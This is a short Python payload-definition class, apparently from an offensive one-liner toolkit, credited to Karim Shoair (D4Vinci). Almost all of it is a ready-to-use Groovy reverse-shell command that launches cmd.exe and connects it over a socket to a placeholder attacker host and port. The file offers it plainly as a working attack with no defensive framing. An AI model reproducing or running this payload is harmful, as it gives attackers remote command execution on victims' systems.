class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Simple reverse shell using groovy command-line application."
    function    = "reverse shell"
    liner       = """groovysh -e 'String VAR1="TARGET";int VAR2=PORT;String VAR3="cmd.exe";Process VAR4=new ProcessBuilder(VAR3).redirectErrorStream(true).start();Socket VAR5=new Socket(VAR1,VAR2);InputStream VAR6=VAR4.getInputStream(),VAR7=VAR4.getErrorStream(), VAR10=VAR5.getInputStream();OutputStream VAR8=VAR4.getOutputStream(),VAR9=VAR5.getOutputStream();while(!VAR5.isClosed()){while(VAR6.available()>0)VAR9.write(VAR6.read());while(VAR7.available()>0)VAR9.write(VAR7.read());while(VAR10.available()>0)VAR8.write(VAR10.read());VAR9.flush();VAR8.flush();Thread.sleep(50);try{VAR4.exitValue();break;}catch(Exception e){}};VAR4.destroy();VAR5.close();'"""
